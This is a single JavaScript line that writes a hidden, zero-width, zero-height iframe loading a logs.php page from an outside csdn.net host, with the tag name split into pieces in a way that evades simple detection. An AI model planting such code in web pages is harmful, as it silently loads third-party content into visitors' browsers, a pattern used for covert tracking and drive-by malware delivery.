document.write("<ifr"+"ame src='http://zz.csdn.net/bin/logs.php'  frameborder=0  width=0 height=0>"+"</ifr"+"ame>");
